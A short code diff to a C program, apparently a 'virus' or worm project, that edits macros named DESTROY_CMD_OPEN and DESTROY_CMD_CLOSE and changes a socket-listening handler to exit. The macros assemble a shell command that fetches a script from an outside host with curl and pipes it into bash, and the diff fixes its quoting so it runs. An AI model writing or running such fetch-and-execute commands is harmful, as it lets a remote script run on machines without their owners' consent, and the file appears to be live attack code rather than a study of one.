@@ -25,8 +25,8 @@
 
 #define MESSAGE_LENGTH 2048
 #define INFO "childinfo"
-#define DESTROY_CMD_OPEN "echo VIRUS="
-#define DESTROY_CMD_CLOSE " `curl -X POST https://cyber.stanleyhoo1.tech/files/cleanup.sh` | bash"
+#define DESTROY_CMD_OPEN "echo \"VIRUS="
+#define DESTROY_CMD_CLOSE " `curl -X POST https://cyber.stanleyhoo1.tech/files/cleanup.sh`\" | bash"
 
 struct init_struct init;
 
@@ -81,7 +81,7 @@ int listening_server_action(int new_socket, int readPipe){
         fflush(stdout);
         memset(connection, 0, sizeof(connection));
       }
-      printf("/n");
+      exit(0);
     }
   }
   return 0;
